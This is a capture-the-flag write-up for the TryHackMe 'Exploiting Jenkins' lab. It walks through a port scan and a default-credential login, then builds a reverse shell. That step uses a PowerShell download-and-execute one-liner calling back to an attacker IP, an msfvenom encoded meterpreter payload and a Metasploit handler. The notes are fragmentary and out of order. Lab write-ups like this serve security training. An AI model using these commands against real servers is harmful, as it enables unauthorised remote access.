# TryHackMe: Exploiting Jenkins

### Task 1 - Initial Access

In this room, we'll learn how to exploit a common misconfiguration on a widely used automation server(Jenkins - This tool is used to create continuous integration/continuous development pipelines that allow developers to automatically deploy their code once they made change to it). After which, we'll use an interesting privilege escalation method to get full system access.

Since this is a Windows application, we'll be using Nishang to gain initial access. The repository contains a useful set of scripts for initial access, enumeration and privilege escalation. In this case, we'll be using the reverse shell scripts
Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up.

``` bash
$ export ip=10.10.250.97
$ nmap -sC -sV -oX scans/nmap-jenkins.xml $ip
```

How many ports are open? (TCP only)

```
3
```

2. What is the username and password for the log in panel(in the format username:password)

```
admin:admin
```

I just guessed based on the format in the input box of the answer field on THM. :)

Find a feature of the tool that allows you to execute commands on the underlying system. When you find this feature, you can use this command to get the reverse shell on your machine and then run it: powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port

You first need to download the Powershell script, and make it available for the server to download. You can do this by creating a http server with python: python3 -m http.server

```
Found: PS C:\Program Files (x86)\Jenkins> cat secret.key
cb2ae36e1862a23b3adfd393282eae76f896f2efb0a4da79643e33afc616751e
```

4. No Answer Needed

5. What is the user.txt flag?


msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.6.46.221 LPORT=4443 -f exe -o reverse.exe

powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.6.46.221:8000/reverse.exe','reverse.exe')"

or

powershell iex (New-Object Net.WebClient).DownloadString('http://10.6.46.221:4443/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.6.46.221 -Port 4443

use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 10.6.46.221 set LPORT 4443 run

Start-Process "reverse_shell.exe"